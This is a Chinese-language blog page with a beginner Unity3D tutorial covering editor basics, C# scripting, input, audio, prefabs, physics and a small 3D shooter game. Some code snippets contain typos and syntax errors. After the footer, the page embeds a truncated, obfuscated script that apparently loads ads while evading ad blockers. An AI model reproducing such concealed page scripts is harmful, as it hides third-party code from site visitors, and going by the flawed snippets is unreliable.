<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Unity3D入门篇 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Unity3D入门篇</h1>
			
		</header>
		<div class="content post__content clearfix">
			


        
                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    
                        
                    
                    <h1>
<a id="_0"></a>相关网址汇总</h1> 
<p></p>
<div class="toc">
 <h3>文章目录</h3>
 <ul>
<li><a href="#_0">相关网址汇总</a></li>
<li><a href="#_11">基本操作以及模块简介</a></li>
<li>
<ul>
<li><a href="#_13">视角操作以及组件</a></li>
<li><a href="#_42">物体操作</a></li>
<li><a href="#_64">模型操作</a></li>
<li><a href="#_93">资源文件</a></li>
<li><a href="#Component_113">组件Component</a></li>
</ul>
  </li>
<li><a href="#_145">脚本与编程</a></li>
<li>
<ul>
<li><a href="#_363">鼠标的输入</a></li>
<li><a href="#_431">键盘的输入</a></li>
<li><a href="#_438">代码来操作组件</a></li>
<li><a href="#API_478">获取物体API</a></li>
<li><a href="#API_531">资源的使用API</a></li>
<li><a href="#_598">定时调用与线程</a></li>
<li><a href="#_618">向量的基本运算</a></li>
<li><a href="#_639">预制体与实例</a></li>
</ul>
  </li>
<li><a href="#_673">物理系统与组件</a></li>
<li>
<ul><li><a href="#_674">刚体组件</a></li></ul>
  </li>
<li><a href="#3D__706">3D 射击游戏实战</a></li>
<li><a href="#_930">恭喜未来的游戏开发工程师，正式入门！！！后会有期！！！</a></li>
</ul>
</div>
<br> 1.Unity官网(外网)：https://unity.com
<br> 
<br> 2.Unity官网(内网)：https://unity.cn
<br> 
<br> 3.Unity学习：
<br> https://learn.unity.com
<br> https://learn.unity.com/projects
<br> 
<br> 4.Unity官方商店：https://assetstore.unity.com
<p></p> 
<h1>
<a id="_11"></a>基本操作以及模块简介</h1> 
<h2>
<a id="_13"></a>视角操作以及组件</h2> 
<p><strong>组件设置</strong><br> 1.<code>导航器Gizmo</code>:表示世界坐标的方向<br> 2.<code>栅格Grid</code>:表示XZ坐标平面<br> 3.<code>天空盒Skybox</code>:表示游戏世界的背景</p> 
<p><strong>3D视图</strong>：<br> 1.<code>旋转视图</code>：右键 / Alt+左键<br> 2.<code>视角缩放</code>：滚轮 / Alt+右键</p> 
<p><strong>导航器</strong>：<br> 1.按住Shift，点击中间的小方块，恢复方向<br> 2.点Y轴，顶视图<br> 3.点X轴，右视图<br> 4.点Z轴，前视图</p> 
<p><strong>视野中心</strong>：<br> 1.<code>将某物体放置于世界中心</code>：选中一个物体，长按住F键<br> <strong>此时旋转视图，似是绕着物体旋转</strong>。<br> 2.出生点:添加一个新物体，其位于视图中心。并不是（0，0，0）。</p> 
<p><strong>透视和正交</strong>：<br> <code>透视视图Perspective</code>：近大远小<br> <code>正交视图Orthographic</code>：等距视图Isometric，物体显示与距离无关<br> <strong>在导航器下方的persp处调节。</strong><br> <br> <code>透视，广角设定</code>:<br> 摄像机的广角Field默认为60°。广角越大，透视畸变太厉害。可以设为30~40°。</p> 
<h2>
<a id="_42"></a>物体操作</h2> 
<p><strong>Unity自带的基础模型</strong></p> 
<ul>
<li>Cube,立方体</li>
<li>Sphere,球体</li>
<li>Capsule,胶囊体</li>
<li>Cylinder,圆柱体</li>
<li>Plane,平面</li>
</ul> 
<p><strong>旋转工具Rotate Tools</strong>：<br> 在Unity中，顺时针旋转，对应方向参量为<strong>负方向</strong>。<br> 逆时针旋转，对应方向参量为<strong>正方形</strong>。<br> 此外，按住ctrl键旋转使其每次角增量为15°。</p> 
<p><strong>缩放工具Scale Tools</strong>:<br> *AF扩展插件：AfSimpleExtension<br> 扩展功能：<br> 1.输出物体的尺寸Scale<br> <br> 2.聚焦到事业重心 G键<br> <br> 3.快速切换正交视图与等距视图。</p> 
<h2>
<a id="_64"></a>模型操作</h2> 
<p><strong>网格Mesh</strong>：存储了模型的形状数据（面，顶点坐标，法向坐标等）。<br> <strong>材质Material</strong>：需添加到物体上，定义了物体的表面细节（颜色，是否金属，粗糙程度，是否透明…）<br> <strong>纹理Textures</strong>：需添加到材质上，可以是贴图。</p> 
<p><img src="https://images2.imgbox.com/a3/a8/SrfUF6SY_o.png" alt="在这里插入图片描述"></p> 
<p>模型建好以后一般导出为 <code>fbx</code>文件格式。</p> 
<p>在Unity中，</p> 
<ul>
<li>一个平面是没有厚度的</li>
<li>正面可见，背面透明</li>
</ul> 
<p>或者说，<strong>平面的背面不会被渲染</strong>。</p> 
<p>※ FBX文件的使用方式：<br> 1.<strong>材质替换</strong></p> 
<ul>
<li>选中 *.fbx 文件</li>
<li>在Inspector 中切到 Materials属性—&gt;Use Embeded Materials,On Demand Remap:映射新的材质</li>
<li>点Apply 应用<br> <br> 2.使用外部材质 Use External Materials</li>
<li>选中fbx文件</li>
<li>Location：Use External Materials使用外部材质</li>
<li>点Apply应用，将内嵌材质解压缩到Materials目录下</li>
<li>直接修改Materials目录下的材质文件。</li>
</ul> 
<h2>
<a id="_93"></a>资源文件</h2> 
<p><strong>资源文件</strong>：Assets目录下的文件，被称为资源。<br> 常见类型：</p> 
<ul>
<li>模型文件Model <code>*.fbx</code>
</li>
<li>图片文件Texture <code>*.jpg/png/psd/tif</code>
</li>
<li>音频文件AudioClip <code>*.mp3/wav/aiff</code>
</li>
<li>脚本文件Script <code>*.cs</code>
</li>
<li>材质文件，场景文件 <code>*.mat,*.unity</code>
</li>
</ul> 
<p><strong>轴心，父子关系，空物体</strong><br> <strong>Global全局坐标系</strong>：绝对坐标，其X Y Z 指向世界的上下东西南北<br> <br> <strong>Local本地坐标系</strong>：相对坐标，其X Y Z 指向模型的前后左右上下<br> <br> 坐标轴的含义：</p> 
<ul>
<li>X：Right 向右</li>
<li>Y：up 向上</li>
<li>Z：forward 向前，一般要求模型直面与Z轴方向一致。</li>
</ul> 
<h2>
<a id="Component_113"></a>组件Component</h2> 
<p><strong>常见组件</strong>：</p> 
<ul>
<li>Light：光照</li>
<li>Mesh Filter：网格过滤器,加载网格数据</li>
<li>Mesh Renderer：网格渲染器，无渲染物体无法显示</li>
</ul> 
<p><strong>组件的增添与删除…</strong><br> <br> <strong>AudioSource组件</strong>的使用方式：<br> 1.添加一个音乐文件 <code>*.mp3/wav/aiff</code><br> 2.创建一个物体</p> 
<ul>
<li>Add Component,Audio | Audio Source</li>
<li>将音乐文件拖到AudioSource.AudioClip属性</li>
<li>在3D窗口上方选 Toggle Audio On</li>
</ul> 
<p><strong>Transform变换组件</strong>：</p> 
<ul>
<li>Position:方位</li>
<li>Rotation:旋转</li>
<li>Scale:尺寸</li>
</ul> 
<p><strong>摄像机组件</strong><br> <strong>实用操作</strong>：<br> <code>Align with View</code>：调整摄像机角度使其与3D视图对齐。</p> 
<p><strong>预制体简述</strong><br> <strong>预制体</strong>：预先规定好信息的一些游戏对象。以便于下次使用。<br> 一些细节：</p> 
<ul>
<li>预制体导出时需要勾选其依赖(材质，脚本等)，否则无法正常使用。</li>
<li>预制体仅仅记录了结点信息</li>
<li>prefab<code>不包含材质贴图数据</code>，仅包含<code>引用</code>
</li>
</ul> 
<h1>
<a id="_145"></a>脚本与编程</h1> 
<p><strong>给游戏对象挂载脚本的步骤</strong>：</p> 
<ul>
<li>创建Scripts文件夹，在其中创建一个C#文件</li>
<li>进入C#，编写代码，并保存</li>
<li>将脚本文件挂载到游戏对象中（拖拽 or AddComponent）即可</li>
</ul> 
<p>Tips：</p> 
<ul>
<li>C#文件名必须和类名一致，否则无法挂载</li>
<li>脚本必须被挂载到物体上，才会被调用</li>
</ul> 
<p><strong>常用的信息代码</strong>：</p> 
<pre><code class="prism language-cs">GameObject obj = this.gameObject; //获取到当前脚本挂载游戏对象
string name = obj.name; //获取到游戏对象名字
Transform tr = obj.transform; // 获取到Transform属性
Vector3 pos = tr.position; //获取到Transfrom中的position值(返回值是三维向量)

Debug.Lo("物体当前的位置："+pos.ToString("F3")); //保留三位小数

//世界坐标和本地坐标
//this.gameObject.transform 可等效写为 this.transform
tr.localPosition; //本地坐标
tr.position; //世界坐标


//修改某物体的坐标
this.transform.localPosition = new Vector3(1.5f, 2.5f, 0);
</code></pre> 
<p><strong>帧更新与物体运动</strong><br> C#代码中的Update()方法：</p> 
<pre><code class="prism language-Cs">void Update()
    {
        //Debug.Log("帧更新 Time：" + Time.time); // 获取游戏时间，测试帧率
        //Debug.Log("帧更新 时间差：" + Time.deltaTime); // 每次刷新的时间差
        
        //物体移动
        //设置小车运动的速度
        float speed = 100;
        float distance = speed * Time.deltaTime;
        Vector3 pos = this.transform.localPosition;
        pos.z += distance;
        this.transform.localPosition = pos;
        
        //使用Translate方法实现物体移动
        this.transform.Translate(0, 0, distance);
        
        //dx,dy,dz分别为三个方向的增量，space可选择相对于哪个坐标系
        this.transform.Translate(dx,dy,dz,space);
        //例子
        this.transfrom.Translate(distance,0,distance,Space.Self/World)
        
    }
</code></pre> 
<p><strong>物体转向</strong></p> 
<pre><code class="prism language-cs">void Start()
{
    //转向（在途中加入一个红旗，获取到红旗方向，让小车向红旗方向运行）
    GameObject flag = GameObject.Find("红旗");
    this.transform.LookAt(flag.transform);
}

void Update(){
    float speed  = 100;
    float distance = speed * Time.deltaTime;
    
    this.transform.Translate(0,0,distance,Space.Self);
}
 
</code></pre> 
<p><strong>小练习：当车到达旗子时，停止运动</strong></p> 
<pre><code class="prism language-cs">public class SimpleLogic : MonoBehaviour
{
    GameObject flag;
    // Start is called before the first frame update
    void Start()
    {
        flag = GameObject.Find("红旗");
        this.transform.LookAt(flag.transform);
    }

    // Update is called once per frame
    void Update()
    { 
        //让小车到达红旗时停下来
        Vector3 p1 = this.transform.position;
        Vector3 p2 = flag.transform.position;
        Vector3 p = p2 - p1;
        //求得两个向量的模值
        float length1to2 = p.magnitude;

        if (length1to2 &gt;= 30)
        {
            //设置小车运动的速度
            float speed = 100;
            float distance = speed * Time.deltaTime;

            this.transform.Translate(0, 0, distance, Space.Self);
        }
    }
}
</code></pre> 
<p><strong>物体的旋转</strong><br> 方式一:采用传统的改Rotation值的方式<br> </p> 
<pre><code class="prism language-cs">//不易操作，官方不建议使用
transform.rotation=...

//建议使用欧拉角的方式
</code></pre> 
<p>方式二：采用欧拉角的计算方法</p> 
<pre><code class="prism language-cs">transform.eulerAngles = new Vector3(0,45,0)
transform.localEulerAngles = new Vector3(0,45,0);
</code></pre> 
<p><strong>案例</strong>：将游戏对象 风扇 转起来<br> 方案一：使用传统欧拉角</p> 
<pre><code class="prism language-cs">void Update()
    {
        //旋转速度(1800°/s)
        float rotateSpeed = 1800;
        float rotateValue = rotateSpeed * Time.deltaTime;

        Vector3 angles = this.transform.localEulerAngles;

        angles.y += rotateValue;

        this.transform.localEulerAngles = angles;
    }
</code></pre> 
<p>方案二：使用Rotate() API直接调用</p> 
<pre><code class="prism language-cs">void Update(){
    //设置旋转速度
    float rotateSpeed = 1800;
    
    this.transform.Rotate(0,rotateSpeed * Time.deltaTime,0,Space.Self);
}
</code></pre> 
<p><strong>脚本与编程的实质</strong>：</p> 
<pre><code class="prism language-cs">//unity框架会自动创建游戏对象为一个结点
GameObject obj = new GameObject();
//紧接着创建该游戏结点下挂载的脚本，并由框架挂载到该游戏结点下
SimpleLogic sl = new SimpleLogic();
//并由Unity自动调用Start和Update方法实现初始化和帧更新
</code></pre> 
<p><strong>消息函数</strong><br> 在c#语言中，所有的脚本类都 应该继承于 <code>MonoBehavior</code> 类，其作用类比于Java中的 <code>Object</code> 类。<br> 消息函数（事件函数）：是指一些回调函数。比如Start()方法会在脚本初始化的时候被调用，而Update()会在帧更新的时候被调用。<br> <br> 常见的消息函数：</p> 
<ul>
<li>Awake:初始化，仅执行一次，组件被禁用时也会调用</li>
<li>Start:初始化，仅执行一次，组件被禁用时不会调用</li>
<li>Update:帧更新，每帧调用一次</li>
<li>OnEnable:当组件启用的时候调用</li>
<li>OnDisable:当组件禁用时被调用</li>
</ul> 
<p><strong>脚本的执行顺序</strong></p> 
<ul>
<li>脚本的执行顺序与Hierarchy中层级顺序无关</li>
<li>一般的，可以在Project Setting中的Scripts Execution Order中设置脚本执行的优先级。但没必要！！！</li>
</ul> 
<p><strong>脚本参数</strong>：<br> </p> 
<blockquote> 
 <p>给脚本添加一个参数：</p> 
</blockquote> 
<pre><code class="prism language-cs">[ Tooltip("这个是Y轴向的角速度") ]
public float rotateSpeed = 30f;
//在Unity中，脚本参数多了一栏Rotate Speed,值为30
</code></pre> 
<p>注意事项：</p> 
<ul>
<li>修饰符必须为 <code>public</code>
</li>
<li>参数名称必须采用驼峰式命名</li>
<li>可采用Tooltip给参数名称添加解释</li>
<li>代码中的规定数值为参数的默认值，通过reset按钮可重置</li>
</ul> 
<p><strong>值类型和引用类型</strong>：<br> 值类型：</p> 
<ul>
<li>值类型本身是一个值，可直接赋值，若未赋值，则默认为0</li>
<li>不能为null</li>
</ul> 
<p>结构体类型:</p> 
<ul>
<li>本质也是值类型，不能设置为null</li>
<li>设置初始值时必须采用new的方式</li>
<li>典例：Vector3</li>
</ul> 
<pre><code class="prism language-cs">public int intValue ; //0
public float floatValue = 0.5f;
public bool boolValue = true;
public string stringValue = "Hello C-Sharp";
public Vector3 rotateSpeed = new Vector3(1,1,1);
</code></pre> 
<p>引用类型：<br> 案例：如果一个平面内有两个红旗，我们需要手动规定小车向哪个红旗移动，就可以采用引用类型的属性</p> 
<pre><code class="prism language-cs">public GameObject target; //目标物体

void Start (){
    this.transform.LookAt(target.transform);
}
</code></pre> 
<p>注意：一定要给引用类型赋值，否则会报 <code>空指针异常</code>。</p> 
<h2>
<a id="_363"></a>鼠标的输入</h2> 
<p>旋转飞车实例：</p> 
<pre><code class="prism language-cs">void Update()
    {
        /*
            0：鼠标左键
            1：鼠标右键
            2：鼠标中键
         */
        if (Input.GetMouseButtonDown(0))
        {
            Debug.Log("鼠标按下");
            rotateSpeed = 900f;
            moveSpeed = 300f;
        }
        if (Input.GetMouseButtonUp(0))
        {
            Debug.Log("鼠标抬起");
            rotateSpeed = 0f;
            moveSpeed = 0f;
        }
        this.transform.Rotate(0, rotateSpeed * Time.deltaTime, 0, Space.Self);
        this.transform.Translate(0, 0, moveSpeed * Time.deltaTime, Space.World);
    }
</code></pre> 
<p>相关API：</p> 
<ul>
<li>
<code>GetMouseButtonDown</code>:鼠标按下</li>
<li>
<code>GetMouseButtonUp</code>:鼠标抬起</li>
<li>
<code>GetMouseButton</code>:状态探测，只要鼠标按下，会一直调用。</li>
</ul> 
<p>旋转飞车实例2：</p> 
<pre><code class="prism language-cs">void Update()
    {
        /*
            0：鼠标左键
            1：鼠标右键
            2：鼠标中键
         */
        if (Input.GetMouseButton(0))
        {
            rotateSpeed = 900f;
            moveSpeed = 300f;
        }
        else
        {
            rotateSpeed = 0;
            moveSpeed = 0;
        }
        this.transform.Rotate(0, rotateSpeed * Time.deltaTime, 0, Space.Self);
        this.transform.Translate(0, 0, moveSpeed * Time.deltaTime, Space.World);
    }
</code></pre> 
<p>&amp;一些补充的工具函数</p> 
<pre><code class="prism language-cs">//获取到鼠标点击的位置坐标
Vector3 mousePos = Input.mousePosition;
//获取到屏幕的尺寸
int screenWidth = Screen.width;
int screenHeight = Screen.height;

//获取物体的屏幕坐标
Vector3 pos = this.transform.position;
Vector3 screenPos = Camera.main.WorldToScreenPoint(pos);
</code></pre> 
<h2>
<a id="_431"></a>键盘的输入</h2> 
<p>常用API：</p> 
<ul>
<li>
<code>Input.GetKeyDown(key)</code>:按键事件，按下</li>
<li>
<code>Input.GetKeyUp(key)</code>:按键事件，抬起</li>
<li>
<code>Input.GetKey(key)</code>:案件状态，是否正被按下</li>
</ul> 
<h2>
<a id="_438"></a>代码来操作组件</h2> 
<p><strong>操作AudioSource组件</strong></p> 
<pre><code class="prism language-cs">//获取到AudioSource组件(泛型)
AudioSource audio = this.GetComponent&lt;AudioSource&gt;();
//播放
audio.Play();
</code></pre> 
<p><strong>引用别的组件</strong>：<br> 应用场景：在主控结点中操作背景音乐的组件</p> 
<pre><code class="prism language-cs">public class MainLogic : MonoBehaviour
{
    //public GameObject bgmNode;
    //引用扬声器组件
    public AudioSource bgm;
    //引用脚本组件
    public FanLogic fan;
    //风扇转速
    public float rotateSpeed;
    
    void Start(){
        //AudioSource audio = bgmNode.GetComponent&lt;AudioSource&gt;();
        //audio.Play();
        bgm.Play();
    }
    
    void Update(){
        if(Input.GetMouseButtonDown(0))
        {
            rotateSpeed = 800;
            //旋转代码在FanLogic脚本下 
        }
    }
}

</code></pre> 
<h2>
<a id="API_478"></a>获取物体API</h2> 
<p>案例：主控结点下找到无人机目录下的旋翼对象,并调用它的脚本组件</p> 
<pre><code class="prism language-cs">//主控结点
//方式二：(在Unity中拖入)
public GameObject wingNode;
//方式一：
void Start(){
    GameObject node = GameObject.Find(无人机/旋翼);
    RotateLogic rotateLogic = node.GetComponent&lt;RotateLogic&gt;();
}

</code></pre> 
<p>获取游戏节点的父级与子级：</p> 
<pre><code class="prism language-cs">//获取当前组件的父结点与父方位
Transform parent = this.transform.parent;
GameObject parentNode = this.transform.parent.gameObject;

//获取子结点的方位
//方式一：通过foreach遍历
foreach (Transform child in transform)
{
    Debug.Log("子物体" + child.name); //child
}

//方式二：通过GetChild()索引API
Transform child = this.transform.GetChild(0);

//方式三：通过名字查找子项
Transform child = this.transform.Find("子项名或路径");
</code></pre> 
<p>给物体设置新的父级：</p> 
<pre><code class="prism language-cs">this.transform.SetParent(null/GameObject);
</code></pre> 
<p>切换物体的显示状态：</p> 
<pre><code class="prism language-cs">Transform child = this.transform.Find("xxx");
if(child.gameObject.activeSelf)
{
    //隐藏
    child.gameObject.SetActive(false);
}
else
{
    //显示
    child.gameObject.SetActive(true);
}
</code></pre> 
<h2>
<a id="API_531"></a>资源的使用API</h2> 
<p>用户按下A，D键播放音效成功与失败</p> 
<pre><code class="prism language-cs">//成功音效
public AudioClip audioSuccess;
//失败音效
public AudioClip audioFail;

void Update()
{
    if (Input.GetKeyDown(KeyCode.A))
    {
        AudioSource audio = GetComponent&lt;AudioSource&gt;();
        audio.PlayOneShot(audioSuccess);
    }
    if (Input.GetKeyDown(KeyCode.D))
    {
       AudioSource audio = GetComponent&lt;AudioSource&gt;();
       audio.PlayOneShot(audioFail);
    }
}
    
</code></pre> 
<p>制作随机音乐盒程序</p> 
<pre><code class="prism language-cs">using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class MusicBox : MonoBehaviour
{
    public AudioClip[] songs;
    
    // Start is called before the first frame update
    void Start()
    {
        if (songs == null || songs.Length == 0)
        {
            Debug.Log("当前歌单列表为空！");
        }
    }

    // Update is called once per frame
    void Update()
    {
        if (Input.GetKeyDown(KeyCode.Space))
        {
            NextSong();
        }
    }

    private void NextSong()
    {
        //随机播放
        int randomIndex = Random.Range(0, songs.Length);

        //取到AudioSource组件
        AudioSource audio = GetComponent&lt;AudioSource&gt;();

        audio.clip = this.songs[randomIndex];
        audio.Play();
        Debug.Log("正在播放第" + (randomIndex+1) + "首歌，歌名为：" + audio.clip.name);
    }
}

</code></pre> 
<h2>
<a id="_598"></a>定时调用与线程</h2> 
<p>Unity是单线程核心，暂时不必考虑线程，调度，并发。</p> 
<pre><code class="prism language-cs">//延迟调用API
this.Invoke("函数名",延迟时间);

//循环调用API
this.InvokeRepeating("函数名",循环时间间隔);

//查看当前线程的ID
int ThreadId = Thread.CurrentThread.ManagedThreadId;

//判断函数是否正在被调用
bool isInvoking = IsInvoking("函数名");
//取消该函数的调用
CancelInvoke("函数名");
//取消当前脚本所有Invoke调用
CancelInvoke();
</code></pre> 
<h2>
<a id="_618"></a>向量的基本运算</h2> 
<pre><code class="prism language-cs">//定义一个三维向量
Vector3 v1 = new Vector3(3,0,4);
//求向量的模长
float length = v1.magnitude;
//向量标准化
Vector3 v2 = v1.normalized;

//物体运动的优化写法
//定义一个三维向量来表示不同方向的速度
public Vector3 speed;

//优化物体移动写法
void Update()
{
     this.transform.Translate(speed * Time.deltaTime,Space.Self);
}

</code></pre> 
<h2>
<a id="_639"></a>预制体与实例</h2> 
<p><strong>通过API创建实例</strong>：</p> 
<ul>
<li>首先准备子弹的预制体prefab</li>
<li>添加火控脚本 FireLogic.cs</li>
</ul> 
<pre><code class="prism language-cs">//子弹预制体
public GameObject bulletPrefab;
//子弹目录
public Transform bulletFolder;
//子弹出生点
public Transform firePoint;
//炮塔的引用（为了获取到炮塔发射子弹的方向）
public Transform cannon;

void Update()
{
    //创建实例
    GameObject node = Object.Instantiate(bulletPrefab,bulletFolder);
    //指定出生点
    node.transform.position = this.firePoint.position;
    //指定初始角度
    node.transform.localEulerAngles = this.cannon.eulerAngles;
    //子弹脚本参数的设置（子弹飞行速度）
    node.GetComponent&lt;BulletLogic&gt;().setSpeed(0.5f);
}
</code></pre> 
<ul><li>销毁子弹</li></ul> 
<pre><code class="prism language-cs">//销毁自身结点的API
Object.Destroy(this.gameObject);
//注意不要写错，写为⬇，该写法是销毁组件，而并非结点
Object.Destroy(this);
</code></pre> 
<h1>
<a id="_673"></a>物理系统与组件</h1> 
<h2>
<a id="_674"></a>刚体组件</h2> 
<p>Physic—&gt;RigidBody:刚体组件 <br> 常用属性：</p> 
<ul>
<li>Mass:质量</li>
<li>Drag：摩擦力</li>
<li>AngularDrag:角摩擦力<br> …</li>
</ul> 
<p>Physic—&gt;Collider:碰撞模型<br> 常用类型：BoxCollider,SphereCollider</p> 
<p><strong>物理材质Phsicas Material</strong>:</p> 
<ul>
<li>在Assets中添加一个Physics Material</li>
<li>在里面设置全局性的摩擦力Friction，弹性系数等等</li>
</ul> 
<p><strong>碰撞检测</strong><br> 实现 <code>碰撞检测</code>的步骤：</p> 
<ul>
<li>RigidBody–&gt;is Kinematic 勾选标记为 运动学刚体</li>
<li>Collider–&gt;is Tragger 勾选 标记为触发器</li>
<li>挂一个脚本，添加消息函数⬇</li>
</ul> 
<pre><code class="prism language-cs">void OnTriggerEnter(Collider other)
{
    //拿到被碰撞物体的名字
    string name = other.name;
    //销毁被碰撞物体
    Object.Destroy(other.gameObject);
    Object.Destroy(this.gameObject);
}
</code></pre> 
<h1>
<a id="3D__706"></a>3D 射击游戏实战</h1> 
<ul>
<li>1.导入模型</li>
<li>2.更改天空盒<br> <code>Window---&gt;Rendering---&gt;lighting---&gt;environment---&gt;Skybox Material</code>
</li>
<li>3.添加子弹，模型，材质，脚本等</li>
<li>4.给子弹和怪兽添加碰撞检测</li>
<li>5.子弹的自动发射，自毁与预制体</li>
<li>6.玩家的按键操作</li>
<li>7.怪兽的走位移动</li>
<li>8.怪兽生成器</li>
<li>9.子弹和爆炸特效</li>
</ul> 
<p><strong>源码展示</strong>：<br> 子弹BulletLogic：</p> 
<pre><code class="prism language-cs">using System.Collections;
using System.Collections.Generic;
using UnityEngine;

/*
    子弹相关逻辑：
        准备工作：子弹的预制体以及导入工程
        1.子弹的Z轴移动
        2.子弹的自毁
        3.子弹的特效导入
 */
public class BulletLogic : MonoBehaviour
{
    //设置子弹的运动速度
    [Tooltip("子弹飞行速度")]
    public Vector3 speed;
    [Tooltip("子弹飞行时长")]
    public float lifetime = 5f;
    [Tooltip("子弹爆炸特效预制体")]
    public GameObject explosionEffect;

    // Start is called before the first frame update
    void Start()
    {
        Invoke("SelfDestroy", lifetime);
    }

    // Update is called once per frame
    void Update()
    {
        this.transform.Translate(speed, Space.Self);
    }

    //触发器函数
    private void OnTriggerEnter(Collider other)
    {
        Debug.Log("发生碰撞了");
        //如果碰撞到怪兽
        if (!other.name.StartsWith("怪兽")) return;
        
        Destroy(this.gameObject);
        Destroy(other.gameObject);

        //创建一个爆炸粒子特效对象
        GameObject node = Object.Instantiate(explosionEffect,null);
        node.transform.position = this.transform.position;
        //当粒子特效播放完成时自动销毁
    }

    //子弹自毁函数
    private void SelfDestroy()
    {
        Debug.Log("子弹已自毁");
        Destroy(this.gameObject);
    }
}

</code></pre> 
<p>玩家PlayerLogic：</p> 
<pre><code class="prism language-cs">using System.Collections;
using System.Collections.Generic;
using UnityEngine;

/*
    玩家相关逻辑：
        准备工作：导入玩家模型的预制体资源
        1.设置子弹发射点，并实现从该点定时发射子弹
        2.添加玩家的按键控制移动
 */
public class PlayerLogic : MonoBehaviour
{
    //预制体资源
    public GameObject bulletPrefab;
    //子弹生成目录
    public Transform bulletFolder;
    //子弹发射点
    public Transform firePoint;
    //子弹发射间隔
    public float fireInterval;
    //玩家移动速度
    public float playerSpeed;

    // Start is called before the first frame update
    void Start()
    {
        InvokeRepeating("fire", fireInterval, fireInterval);
    }

    // Update is called once per frame
    void Update()
    {
        float speedX = 0;
        //按键控制
        if (Input.GetKey(KeyCode.A))
        {
            speedX = -playerSpeed;
        }
        else if (Input.GetKey(KeyCode.D))
        {
            speedX = playerSpeed;
        }
        else
        {
            speedX = 0;
        }
        this.transform.Translate(speedX * Time.deltaTime, 0, 0, Space.Self);
        
    }

    //发射子弹的函数
    private void fire()
    {
        //生成一个子弹实例
        GameObject bullet = Object.Instantiate(bulletPrefab, bulletFolder);
        //设置子弹的出生点
        bullet.transform.position = this.firePoint.position;
    }
}

</code></pre> 
<p>怪兽EnemyLogic:</p> 
<pre><code class="prism language-cs">using System.Collections;
using System.Collections.Generic;
using UnityEngine;

/*
    怪兽相关逻辑：
        准备工作：导入怪兽的预制体进工程
        1.水平速度的蛇皮走位逻辑
        2.前后速度的固定逻辑
 */
public class EnemyLogic : MonoBehaviour
{
    //水平速度
    float speedX = 0;
    //前后速度
    public float speedZ;

    // Start is called before the first frame update
    void Start()
    {
        //重复周期调用蛇皮走位
        InvokeRepeating("move", 0.1f, 0.5f);
    }

    // Update is called once per frame
    void Update()
    {
        this.transform.Translate(speedX * Time.deltaTime, 0, speedZ * Time.deltaTime, Space.Self);
    }

    //怪兽的蛇皮走位
    private void move()
    {
        //设置一个随机速度数组
        float[] speed = { -5, -10, -20,-30, 5, 10, 20 ,30};
        //随机选取一个速度作为水平速度
        int rnum = Random.Range(0, speed.Length);
        //设置速度
        speedX = speed[rnum];
    }
}

</code></pre> 
<p>怪兽生成器EnemyCreator:</p> 
<pre><code class="prism language-cs">using System.Collections;
using System.Collections.Generic;
using UnityEngine;

/*
    怪兽生成器相关逻辑：
        1.定时生成怪兽即可
 */
public class EnemyCreator : MonoBehaviour
{
    //要创建的怪兽预制体
    public GameObject enemyPrefab;
    //创建怪物间隔时长
    public float enemyInterval = 0.5f;
    

    // Start is called before the first frame update
    void Start()
    {
        InvokeRepeating("creatEnemy", 0.1f, enemyInterval);
    }

    // Update is called once per frame
    void Update()
    {
        
    }

    private void creatEnemy()
    {
        GameObject node = GameObject.Instantiate(enemyPrefab, this.transform);
        node.transform.position = this.transform.position;

        //调整随机出生点
        int rnum = Random.Range(-50, 50);
        node.transform.Translate(rnum, 0, 0, Space.Self);
    }
}

</code></pre> 
<h1>
<a id="_930"></a>恭喜未来的游戏开发工程师，正式入门！！！后会有期！！！</h1>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new 